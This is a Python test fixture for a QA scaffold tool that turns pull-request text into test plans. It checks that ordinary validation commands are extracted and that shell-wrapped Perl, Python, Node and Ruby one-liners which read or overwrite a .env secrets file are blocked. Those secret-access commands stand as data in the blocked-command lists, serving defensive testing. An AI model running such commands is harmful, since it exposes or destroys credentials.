    unsafe_shell_wrapped_interpreter_secret_access_forbidden_command_parts = [
        ["bash", "-lc", "perl -pi -e s/TOKEN/REDACTED/ .env"],
        ["bash", "-lc", "perl -ne print .env"],
        ["bash", "-lc", "python -c \"from pathlib import Path; Path(\\\".env\\\").write_text(\\\"x\\\")\""],
        ["bash", "-lc", "node -e \"require(\\\"fs\\\").writeFileSync(\\\".env\\\",\\\"x\\\")\""],
    ]
    assert_true(
        unsafe_shell_wrapped_interpreter_secret_access_summary.get("validation_command_count") == 4,
        "safe shell-wrapped interpreter artifact reads and npm validation should stay executable.",
    )
    assert_true(
        unsafe_shell_wrapped_interpreter_secret_access_summary.get("blocked_validation_command_count") == 4,
        "shell-wrapped Perl/Python/Node secret access commands should be blocked validation commands.",
    )
    assert_true(
        unsafe_shell_wrapped_interpreter_secret_access_summary.get("blocked_validation_commands") == unsafe_shell_wrapped_interpreter_secret_access_blocked_commands,
        "blocked shell-wrapped interpreter secret access commands should preserve the original source lines for auditability.",
    )
    assert_true(
        ["bash", "-lc", "perl -ne print tmp/results"] in unsafe_shell_wrapped_interpreter_secret_access_commands,
        "safe Perl artifact read should stay executable.",
    )
    assert_true(
        ["bash", "-lc", "python -c \"from pathlib import Path; print(Path(\\\"tmp/results\\\").read_text())\""] in unsafe_shell_wrapped_interpreter_secret_access_commands,
        "safe Python artifact read should stay executable.",
    )
    assert_true(
        ["bash", "-lc", "node -e \"console.log(require(\\\"fs\\\").readFileSync(\\\"tmp/results\\\",\\\"utf8\\\"))\""] in unsafe_shell_wrapped_interpreter_secret_access_commands,
        "safe Node artifact read should stay executable.",
    )
    assert_true(
        ["bash", "-lc", "npm test -- inline-interpreter-secret-access"] in unsafe_shell_wrapped_interpreter_secret_access_commands,
        "safe npm test should stay executable.",
    )
    for command_parts in unsafe_shell_wrapped_interpreter_secret_access_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_wrapped_interpreter_secret_access_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    unsafe_shell_wrapped_interpreter_secret_access_coverage_path = unsafe_shell_wrapped_interpreter_secret_access_dir / "requirement-coverage.json"
    unsafe_shell_wrapped_interpreter_secret_access_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_wrapped_interpreter_secret_access_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_wrapped_interpreter_secret_access_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_wrapped_interpreter_secret_access_coverage_path),
        ],
        cwd=unsafe_shell_wrapped_interpreter_secret_access_dir,
        text=True,
        capture_output=True,
    )
    assert_true(
        unsafe_shell_wrapped_interpreter_secret_access_coverage_proc.returncode == 0,
        "shell-wrapped interpreter secret access and safe artifact source lines should remain fully covered.",
    )
    unsafe_shell_wrapped_interpreter_secret_access_coverage = load_json(unsafe_shell_wrapped_interpreter_secret_access_coverage_path)
    unsafe_shell_wrapped_interpreter_secret_access_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_wrapped_interpreter_secret_access_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_wrapped_interpreter_secret_access_blocked_commands:
        command_matches = unsafe_shell_wrapped_interpreter_secret_access_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    for command in (
        "bash -lc 'perl -ne print tmp/results'",
        "bash -lc 'python -c \"from pathlib import Path; print(Path(\\\"tmp/results\\\").read_text())\"'",
        "bash -lc 'node -e \"console.log(require(\\\"fs\\\").readFileSync(\\\"tmp/results\\\",\\\"utf8\\\"))\"'",
    ):
        command_matches = unsafe_shell_wrapped_interpreter_secret_access_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Untested" for match in command_matches),
            f"{command} source line should map to an executable untested requirement.",
        )
    assert_true(
        unsafe_shell_wrapped_interpreter_secret_access_coverage.get("coverage_complete") is True,
        "shell-wrapped interpreter secret access source coverage should remain complete.",
    )

def _verify_secret_interpreter_write_safety(script_dir: Path, tmp_path: Path) -> None:
    """验证包装解释器的秘密写入边界。"""
    unsafe_shell_wrapped_ruby_secret_write_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_WRAPPED_RUBY_SECRET_WRITE_CODE_PR_REQUIREMENT,
        "unsafe-shell-wrapped-ruby-secret-write-code-pr-scaffold",
    )
    unsafe_shell_wrapped_ruby_secret_write_summary = load_json(unsafe_shell_wrapped_ruby_secret_write_dir / "scaffold-summary.json")
    unsafe_shell_wrapped_ruby_secret_write_plan = load_json(unsafe_shell_wrapped_ruby_secret_write_dir / "test-plan.json")
    unsafe_shell_wrapped_ruby_secret_write_steps = [
        step
        for scenario in unsafe_shell_wrapped_ruby_secret_write_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_wrapped_ruby_secret_write_commands = [
        step.get("command")
        for step in unsafe_shell_wrapped_ruby_secret_write_steps
        if step.get("action") == "command"
    ]
    unsafe_shell_wrapped_ruby_secret_write_blocked_commands = [
        "bash -lc \"ruby -e 'File.write(\\\".env\\\",\\\"x\\\")'\"",
        "bash -lc \"ruby -e 'IO.write(\\\".env\\\",\\\"x\\\")'\"",
        "bash -lc \"ruby -e 'File.open(\\\".env\\\",\\\"w\\\") { |f| f.write(\\\"x\\\") }'\"",
    ]
    unsafe_shell_wrapped_ruby_secret_write_forbidden_command_parts = [
        ["bash", "-lc", "ruby -e 'File.write(\".env\",\"x\")'"],
        ["bash", "-lc", "ruby -e 'IO.write(\".env\",\"x\")'"],
        ["bash", "-lc", "ruby -e 'File.open(\".env\",\"w\") { |f| f.write(\"x\") }'"],
    ]
    assert_true(
        unsafe_shell_wrapped_ruby_secret_write_summary.get("validation_command_count") == 3,
        "safe shell-wrapped Ruby artifact writes and npm validation should stay executable.",
    )
    assert_true(
        unsafe_shell_wrapped_ruby_secret_write_summary.get("blocked_validation_command_count") == 3,
        "shell-wrapped Ruby secret file writes should be blocked validation commands.",
    )
    assert_true(
        unsafe_shell_wrapped_ruby_secret_write_summary.get("blocked_validation_commands") == unsafe_shell_wrapped_ruby_secret_write_blocked_commands,
        "blocked Ruby secret write commands should preserve the original source lines for auditability.",
    )
    assert_true(
        ["bash", "-lc", "ruby -e 'File.write(\"tmp/results\",\"x\")'"] in unsafe_shell_wrapped_ruby_secret_write_commands,
        "safe Ruby File.write artifact command should stay executable.",
    )
    assert_true(
        ["bash", "-lc", "ruby -e 'IO.write(\"tmp/results\",\"x\")'"] in unsafe_shell_wrapped_ruby_secret_write_commands,
        "safe Ruby IO.write artifact command should stay executable.",
    )
    assert_true(
        ["bash", "-lc", "npm test -- ruby-inline-secret-write"] in unsafe_shell_wrapped_ruby_secret_write_commands,
        "safe Ruby write npm test should stay executable.",
    )
    for command_parts in unsafe_shell_wrapped_ruby_secret_write_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_wrapped_ruby_secret_write_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    unsafe_shell_wrapped_ruby_secret_write_coverage_path = unsafe_shell_wrapped_ruby_secret_write_dir / "requirement-coverage.json"
    unsafe_shell_wrapped_ruby_secret_write_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_wrapped_ruby_secret_write_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_wrapped_ruby_secret_write_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_wrapped_ruby_secret_write_coverage_path),
        ],
        cwd=unsafe_shell_wrapped_ruby_secret_write_dir,
        text=True,
        capture_output=True,
    )
    assert_true(
        unsafe_shell_wrapped_ruby_secret_write_coverage_proc.returncode == 0,
        "Ruby secret write and safe artifact source lines should remain fully covered.",
    )
    unsafe_shell_wrapped_ruby_secret_write_coverage = load_json(unsafe_shell_wrapped_ruby_secret_write_coverage_path)
    unsafe_shell_wrapped_ruby_secret_write_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_wrapped_ruby_secret_write_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_wrapped_ruby_secret_write_blocked_commands:
        command_matches = unsafe_shell_wrapped_ruby_secret_write_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    for command in (
        "bash -lc \"ruby -e 'File.write(\\\"tmp/results\\\",\\\"x\\\")'\"",
        "bash -lc \"ruby -e 'IO.write(\\\"tmp/results\\\",\\\"x\\\")'\"",
    ):
        command_matches = unsafe_shell_wrapped_ruby_secret_write_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Untested" for match in command_matches),
            f"{command} source line should map to an executable untested requirement.",
        )
    assert_true(
        unsafe_shell_wrapped_ruby_secret_write_coverage.get("coverage_complete") is True,
        "Ruby secret write source coverage should remain complete.",
    )

_SECRET_WRITE_AND_INTERPRETER_SCENARIO_FAMILIES: tuple[Callable[[Path, Path], None], ...] = (
    _verify_secret_command_and_heredoc_safety,
    _verify_secret_write_tool_safety,
    _verify_secret_metadata_mutation_safety,
    _verify_secret_interpreter_read_safety,
    _verify_secret_interpreter_write_safety,
)

def _verify_secret_write_and_interpreter_safety(script_dir: Path, tmp_path: Path) -> None:
    """按安全语义边界运行子场景，并保留原有场景族入口。"""
    for family in _SECRET_WRITE_AND_INTERPRETER_SCENARIO_FAMILIES:
        try:
            family(script_dir, tmp_path)
        except AssertionError as exc:
            raise AssertionError(f"{family.__name__}: {exc}") from exc


def _verify_command_text_and_product_boundary(script_dir: Path, tmp_path: Path) -> None:
    mixed_runtime_dir = _write_and_run_scaffold(script_dir, tmp_path, MIXED_RUNTIME_CODE_PR_REQUIREMENT, "mixed-runtime-code-pr-scaffold")
    mixed_runtime_summary = load_json(mixed_runtime_dir / "scaffold-summary.json")
    mixed_runtime_plan = load_json(mixed_runtime_dir / "test-plan.json")
    mixed_runtime_matrix = load_json(mixed_runtime_dir / "test-matrix.json")
    mixed_runtime_steps = [
        step
        for scenario in mixed_runtime_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    mixed_runtime_actions = {step.get("action") for step in mixed_runtime_steps}
    mixed_runtime_commands = [step.get("command") for step in mixed_runtime_steps if step.get("action") == "command"]
    mixed_runtime_test_types = {test.get("type") for test in mixed_runtime_matrix.get("tests", []) if isinstance(test, dict)}
    assert_true(mixed_runtime_summary.get("scaffold_mode") == "hybrid_code_pr_runtime", "PRs with explicit runtime acceptance criteria should use hybrid code_pr/runtime scaffold mode.")
    assert_true("goto" in mixed_runtime_actions, "hybrid code PR runtime scaffold should generate a UI route probe for explicit UI acceptance criteria.")
    assert_true(
        bool({"api", "pollApi", "clickAndWaitForResponse"}.intersection(mixed_runtime_actions)),
        "hybrid code PR runtime scaffold should generate API or UI-to-API probe evidence for explicit API acceptance criteria.",
    )
    assert_true(["pnpm", "--filter", "web", "test", "--", "settings"] in mixed_runtime_commands, "hybrid code PR runtime scaffold should preserve safe validation commands.")
    assert_true("code_pr" in mixed_runtime_test_types, "hybrid code PR runtime scaffold should keep code_pr command evidence.")
    assert_true("api" in mixed_runtime_test_types or "ui_to_api" in mixed_runtime_test_types, "hybrid code PR runtime scaffold should keep explicit API acceptance coverage.")
    assert_true("command" not in mixed_runtime_test_types, "backticked runtime routes in PR acceptance criteria should not become shell command tests.")
    tests_by_id = {
        test.get("id"): test
        for test in mixed_runtime_matrix.get("tests", [])
        if isinstance(test, dict)
    }
    source_path_requirements = [
        req
        for req in mixed_runtime_matrix.get("requirements", [])
        if isinstance(req, dict)
        and (
            "apps/web/src/settings/page.tsx" in str(req.get("text") or "")
            or "services/api/src/settings.py" in str(req.get("text") or "")
        )
    ]
    assert_true(source_path_requirements, "hybrid code PR source-path summary lines should remain represented in the matrix.")
    for req in source_path_requirements:
        mapped_types = {
            tests_by_id.get(test_id, {}).get("type")
            for test_id in req.get("test_ids", [])
        }
        assert_true(mapped_types == {"code_pr"}, "hybrid code PR source-path summary lines should map only to code_pr tests, not UI/API runtime probes.")
    mixed_runtime_coverage_path = mixed_runtime_dir / "requirement-coverage.json"
    mixed_runtime_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(mixed_runtime_dir / "requirement.md"),
            "--matrix",
            str(mixed_runtime_dir / "test-matrix.json"),
            "--out",
            str(mixed_runtime_coverage_path),
        ],
        cwd=mixed_runtime_dir,
        text=True,
        capture_output=True,
    )
    assert_true(mixed_runtime_coverage_proc.returncode == 0, "hybrid code PR source summary and runtime acceptance should have complete strict source coverage.")

    hybrid_changed_dir = _write_and_run_scaffold(script_dir, tmp_path, HYBRID_CHANGED_FILES_CODE_PR_REQUIREMENT, "hybrid-changed-files-code-pr-scaffold")
    hybrid_changed_summary = load_json(hybrid_changed_dir / "scaffold-summary.json")
    hybrid_changed_matrix = load_json(hybrid_changed_dir / "test-matrix.json")
    assert_true(hybrid_changed_summary.get("scaffold_mode") == "hybrid_code_pr_runtime", "PRs with raw changed-file bullets and runtime criteria should use hybrid mode.")
    changed_tests_by_id = {
        test.get("id"): test
        for test in hybrid_changed_matrix.get("tests", [])
        if isinstance(test, dict)
    }
    changed_source_requirements = [
        req
        for req in hybrid_changed_matrix.get("requirements", [])
        if isinstance(req, dict)
        and (
            "apps/web/src/settings/page.tsx" in str(req.get("text") or "")
            or "services/api/src/settings.py" in str(req.get("text") or "")
        )
    ]
    assert_true(changed_source_requirements, "hybrid raw changed-file bullets should remain represented in the code_pr matrix.")
    for req in changed_source_requirements:
        mapped_types = {
            changed_tests_by_id.get(test_id, {}).get("type")
            for test_id in req.get("test_ids", [])
        }
        assert_true(mapped_types == {"code_pr"}, "hybrid raw changed-file bullets should map only to code_pr tests, not UI/API runtime probes.")

    plain_table_dir = _assert_code_pr_scaffold(script_dir, tmp_path, PLAIN_TABLE_CODE_PR_REQUIREMENT, "plain-table-code-pr-scaffold", 4, 3)
    plain_table_plan = load_json(plain_table_dir / "test-plan.json")
    plain_table_steps = [
        step
        for scenario in plain_table_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    plain_table_commands = [step.get("command") for step in plain_table_steps]
    assert_true(["python", "-m", "pytest", "services/api/tests/test_search.py"] in plain_table_commands, "Plain Markdown table command cells should create a pytest validation step.")
    assert_true(["npx", "playwright", "test", "tests/search.spec.ts"] in plain_table_commands, "Plain Markdown table command cells should create a Playwright validation step.")
    assert_true(["pnpm", "--filter", "web", "test", "--", "search"] in plain_table_commands, "Plain Markdown table command cells should create a pnpm validation step.")

    labeled_list_dir = _assert_code_pr_scaffold(script_dir, tmp_path, LABELED_LIST_CODE_PR_REQUIREMENT, "labeled-list-code-pr-scaffold", 4, 3)
    labeled_list_plan = load_json(labeled_list_dir / "test-plan.json")
    labeled_list_steps = [
        step
        for scenario in labeled_list_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    labeled_list_commands = [step.get("command") for step in labeled_list_steps]
    assert_true(["pnpm", "--filter", "web", "test", "--", "payments"] in labeled_list_commands, "Labeled validation list item should create a pnpm validation step.")
    assert_true(["python", "-m", "pytest", "services/api/tests/test_payments.py"] in labeled_list_commands, "Labeled validation list item should create a pytest validation step.")
    assert_true(["npx", "playwright", "test", "tests/payments.spec.ts"] in labeled_list_commands, "Labeled validation list item should create a Playwright validation step.")

    inline_validation_dir = _assert_code_pr_scaffold(script_dir, tmp_path, INLINE_VALIDATION_CODE_PR_REQUIREMENT, "inline-validation-code-pr-scaffold", 4, 3)
    inline_validation_plan = load_json(inline_validation_dir / "test-plan.json")
    inline_validation_steps = [
        step
        for scenario in inline_validation_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    inline_validation_commands = [step.get("command") for step in inline_validation_steps]
    assert_true(["pnpm", "--filter", "web", "test", "--", "reports"] in inline_validation_commands, "Inline Tests label should create a pnpm validation step.")
    assert_true(["python", "-m", "pytest", "services/api/tests/test_reports.py"] in inline_validation_commands, "Inline API check label should create a pytest validation step.")
    assert_true(["npx", "playwright", "test", "tests/reports.spec.ts"] in inline_validation_commands, "Inline QA label should create a Playwright validation step.")

    multi_backtick_inline_dir = _assert_code_pr_scaffold(script_dir, tmp_path, MULTI_BACKTICK_INLINE_VALIDATION_CODE_PR_REQUIREMENT, "multi-backtick-inline-validation-code-pr-scaffold", 3, 2)
    multi_backtick_inline_plan = load_json(multi_backtick_inline_dir / "test-plan.json")
    multi_backtick_inline_steps = [
        step
        for scenario in multi_backtick_inline_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    multi_backtick_inline_commands = [step.get("command") for step in multi_backtick_inline_steps]
    assert_true(["python", "-m", "pytest", "services/api/tests/test_orders.py"] in multi_backtick_inline_commands, "Inline label with two backticked commands should create a clean pytest validation step.")
    assert_true(["npm", "test", "--", "orders"] in multi_backtick_inline_commands, "Inline label with two backticked commands should create a clean npm validation step.")
    assert_true(
        not any(any("`" in str(part) or part == "and" for part in command) for command in multi_backtick_inline_commands if isinstance(command, list)),
        "Inline label command extraction must not leave backtick fragments or natural-language joiners in command arrays.",
    )

    mixed_backtick_bare_dir = _assert_code_pr_scaffold(script_dir, tmp_path, MIXED_BACKTICK_BARE_VALIDATION_CODE_PR_REQUIREMENT, "mixed-backtick-bare-validation-code-pr-scaffold", 3, 2)
    mixed_backtick_bare_plan = load_json(mixed_backtick_bare_dir / "test-plan.json")
    mixed_backtick_bare_steps = [
        step
        for scenario in mixed_backtick_bare_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    mixed_backtick_bare_commands = [step.get("command") for step in mixed_backtick_bare_steps]
    assert_true(["python", "-m", "pytest", "services/api/tests/test_credits.py"] in mixed_backtick_bare_commands, "Mixed backticked/bare inline validation should create a clean pytest step.")
    assert_true(["npm", "test", "--", "credits"] in mixed_backtick_bare_commands, "Mixed backticked/bare inline validation should create the bare npm step.")

    must_run_bare_dir = _assert_code_pr_scaffold(script_dir, tmp_path, MUST_RUN_BARE_VALIDATION_CODE_PR_REQUIREMENT, "must-run-bare-validation-code-pr-scaffold", 3, 2)
    must_run_bare_plan = load_json(must_run_bare_dir / "test-plan.json")
    must_run_bare_steps = [
        step
        for scenario in must_run_bare_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    must_run_bare_commands = [step.get("command") for step in must_run_bare_steps]
    assert_true(["python", "-m", "pytest", "services/api/tests/test_invoices.py"] in must_run_bare_commands, "Bare 'Validation must run' phrasing should create a clean pytest step.")
    assert_true(["npm", "test", "--", "invoices"] in must_run_bare_commands, "Bare 'Validation must run' phrasing should create a clean npm step without trailing prose.")

    natural_language_and_dir = _assert_code_pr_scaffold(script_dir, tmp_path, NATURAL_LANGUAGE_AND_VALIDATION_CODE_PR_REQUIREMENT, "natural-language-and-validation-code-pr-scaffold", 3, 2)
    natural_language_and_plan = load_json(natural_language_and_dir / "test-plan.json")
    natural_language_and_steps = [
        step
        for scenario in natural_language_and_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    natural_language_and_commands = [step.get("command") for step in natural_language_and_steps]
    assert_true(["python", "-m", "pytest", "services/api/tests/test_refunds.py"] in natural_language_and_commands, "Natural-language and-separated validation should create a clean pytest step.")
    assert_true(["npm", "test", "--", "refunds"] in natural_language_and_commands, "Natural-language and-separated validation should create a clean npm step.")
    assert_true(
        not any("and" in command for command in natural_language_and_commands if isinstance(command, list)),
        "Natural-language and-separated validation must not keep 'and' as a command argument.",
    )
    natural_language_and_coverage_path = natural_language_and_dir / "requirement-coverage.json"
    natural_language_and_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(natural_language_and_dir / "requirement.md"),
            "--matrix",
            str(natural_language_and_dir / "test-matrix.json"),
            "--out",
            str(natural_language_and_coverage_path),
        ],
        cwd=natural_language_and_dir,
        text=True,
        capture_output=True,
    )
    assert_true(natural_language_and_coverage_proc.returncode == 0, "Natural-language and-separated validation commands should have strict source coverage.")
    natural_language_and_coverage = load_json(natural_language_and_coverage_path)
    assert_true(natural_language_and_coverage.get("coverage_complete") is True, "Natural-language and-separated validation source line should be completely covered.")

    comma_separated_dir = _assert_code_pr_scaffold(script_dir, tmp_path, COMMA_SEPARATED_VALIDATION_CODE_PR_REQUIREMENT, "comma-separated-validation-code-pr-scaffold", 3, 2)
    comma_separated_plan = load_json(comma_separated_dir / "test-plan.json")
    comma_separated_steps = [
        step
        for scenario in comma_separated_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    comma_separated_commands = [step.get("command") for step in comma_separated_steps]
    assert_true(["python", "-m", "pytest", "services/api/tests/test_ledgers.py"] in comma_separated_commands, "Comma-separated validation should create a clean pytest step.")
    assert_true(["npm", "test", "--", "ledgers"] in comma_separated_commands, "Comma-separated validation should create a clean npm step.")
    assert_true(
        not any("," in str(part) for command in comma_separated_commands if isinstance(command, list) for part in command),
        "Comma-separated validation must not keep punctuation in command arrays.",
    )
    comma_separated_coverage_path = comma_separated_dir / "requirement-coverage.json"
    comma_separated_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(comma_separated_dir / "requirement.md"),
            "--matrix",
            str(comma_separated_dir / "test-matrix.json"),
            "--out",
            str(comma_separated_coverage_path),
        ],
        cwd=comma_separated_dir,
        text=True,
        capture_output=True,
    )
    assert_true(comma_separated_coverage_proc.returncode == 0, "Comma-separated validation commands should have strict source coverage.")
    comma_separated_coverage = load_json(comma_separated_coverage_path)
    assert_true(comma_separated_coverage.get("coverage_complete") is True, "Comma-separated validation source line should be completely covered.")

    tested_with_bare_dir = _assert_code_pr_scaffold(script_dir, tmp_path, TESTED_WITH_BARE_VALIDATION_CODE_PR_REQUIREMENT, "tested-with-bare-validation-code-pr-scaffold", 3, 2)
    tested_with_bare_plan = load_json(tested_with_bare_dir / "test-plan.json")
    tested_with_bare_steps = [
        step
        for scenario in tested_with_bare_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    tested_with_bare_commands = [step.get("command") for step in tested_with_bare_steps]
    assert_true(["python", "-m", "pytest", "services/api/tests/test_payouts.py"] in tested_with_bare_commands, "Bare Tested-with sentence should create a clean pytest step.")
    assert_true(["npm", "test", "--", "payouts"] in tested_with_bare_commands, "Bare Tested-with sentence should create a clean npm step.")

    emoji_validation_dir = _assert_code_pr_scaffold(script_dir, tmp_path, EMOJI_VALIDATION_CODE_PR_REQUIREMENT, "emoji-validation-code-pr-scaffold", 4, 3)
    emoji_validation_plan = load_json(emoji_validation_dir / "test-plan.json")
    emoji_validation_steps = [
        step
        for scenario in emoji_validation_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    emoji_validation_commands = [step.get("command") for step in emoji_validation_steps]
    assert_true(["pnpm", "--filter", "web", "test", "--", "invoices"] in emoji_validation_commands, "Emoji-prefixed pnpm validation item should create a command step.")
    assert_true(["python", "-m", "pytest", "services/api/tests/test_invoices.py"] in emoji_validation_commands, "Emoji-prefixed pytest validation item should create a command step.")
    assert_true(["npx", "playwright", "test", "tests/invoices.spec.ts"] in emoji_validation_commands, "Emoji-prefixed Playwright validation item should create a command step.")

    past_tense_dir = _assert_code_pr_scaffold(script_dir, tmp_path, PAST_TENSE_VALIDATION_CODE_PR_REQUIREMENT, "past-tense-validation-code-pr-scaffold", 4, 4)
    past_tense_plan = load_json(past_tense_dir / "test-plan.json")
    past_tense_steps = [
        step
        for scenario in past_tense_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    past_tense_commands = [step.get("command") for step in past_tense_steps]
    assert_true(["pnpm", "--filter", "web", "test", "--", "shipments"] in past_tense_commands, "Verified-with sentence should create a pnpm validation step.")
    assert_true(["python", "-m", "pytest", "services/api/tests/test_shipments.py"] in past_tense_commands, "Validated-with sentence should create a pytest validation step.")
    assert_true(["npx", "playwright", "test", "tests/shipments.spec.ts"] in past_tense_commands, "Browser verified-with sentence should create a Playwright validation step.")
    assert_true(["pnpm", "--filter", "web", "typecheck"] in past_tense_commands, "Checks performed section should create a typecheck validation step.")

    product_dir = _write_and_run_scaffold(script_dir, tmp_path, PRODUCT_REQUIREMENT_WITH_CODE_PATH, "product-code-path-scaffold")
    product_summary = load_json(product_dir / "scaffold-summary.json")
    product_plan = load_json(product_dir / "test-plan.json")
    product_matrix = load_json(product_dir / "test-matrix.json")
    product_business_model = load_json(product_dir / "business-model.json")
    product_steps = [
        step
        for scenario in product_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    product_actions = {step.get("action") for step in product_steps}
    product_paths = {step.get("path") for step in product_steps if step.get("path")}
    product_test_types = {test.get("type") for test in product_matrix.get("tests", []) if isinstance(test, dict)}
    product_business_paths = [*product_business_model.get("entry_points", []), *product_business_model.get("api_paths", [])]

    assert_true(product_summary.get("scaffold_mode") != "code_pr", "Product QA with an implementation code path must not use code_pr scaffold mode.")
    assert_true("code_pr" not in product_test_types, "Product QA with an implementation code path must not create code_pr matrix tests.")
    assert_true("command" not in product_test_types, "Bare source file paths in product QA must not become command matrix tests.")
    assert_true("command" not in product_actions, "Bare source file paths in product QA must not become command plan steps.")
    assert_true({"ui", "api", "interaction"}.issubset(product_test_types), "Product QA should preserve UI/API/interaction modeling despite implementation code paths.")
    assert_true("/billing" in product_paths, "Product QA should keep the user-facing entry route.")
    assert_true("/api/v1/billing/checkout" in product_business_paths, "Product QA should keep the product API path.")


_CODE_PR_SCENARIO_FAMILIES: tuple[Callable[[Path, Path], None], ...] = (
    _verify_command_extraction,
    _verify_build_and_release_safety,
    _verify_secret_boundary,
    _verify_shell_substitution_safety,
    _verify_secret_read_safety,
    _verify_secret_write_and_interpreter_safety,
    _verify_command_text_and_product_boundary,
)


def run_code_pr_scaffold_fixture(script_dir: Path, tmp_path: Path) -> None:
    """按契约族运行代码 PR 夹具，并把失败定位到具体语义边界。"""
    for family in _CODE_PR_SCENARIO_FAMILIES:
        try:
            family(script_dir, tmp_path)
        except AssertionError as exc:
            raise AssertionError(f"{family.__name__}: {exc}") from exc
